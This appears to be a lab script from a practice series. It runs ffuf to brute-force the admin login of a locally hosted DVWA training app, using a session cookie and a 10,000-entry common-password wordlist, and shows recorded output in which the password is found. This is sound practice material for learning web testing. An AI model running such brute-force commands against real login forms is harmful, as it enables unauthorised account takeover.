#!/bin/bash
# ============================================================
# Script 01 — ffuf Brute Force (Low Security)
# Target: http://localhost/vulnerabilities/brute/
# Tool: ffuf v2.1.0-dev
# Security Level: Low
# ============================================================

# Prerequisites:
# - DVWA running via Docker on localhost
# - Logged into DVWA and session cookie retrieved from DevTools
# - SecLists installed at ~/SecLists
# - ffuf installed via: brew install ffuf

# Replace PHPSESSID value with your own session token
# Retrieved from: DevTools → Application → Cookies → localhost

ffuf -u "http://localhost/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login" \
  -b "PHPSESSID=9hk57p2b4a5st7cmpgnem7g1e5; security=low" \
  -w ~/SecLists/Passwords/Common-Credentials/10k-most-common.txt \
  -fr "Username and/or password incorrect"

# ------------------------------------------------------------
# Flag reference:
# -u     Target URL — FUZZ is the placeholder replaced per attempt
# -b     Cookie — session auth required to reach the form
# -w     Wordlist — 10,000 most common passwords
# -fr    Filter regexp — hide responses containing this string
#        Only responses WITHOUT this string are shown (= success)
# ------------------------------------------------------------

# ------------------------------------------------------------
# Result:
# password  [Status: 200, Size: 4413, Words: 179, Lines: 109]
# Speed: 1666 req/sec | Duration: 6 seconds | 10,000 tried
# ✅ Password found: "password"
# ------------------------------------------------------------
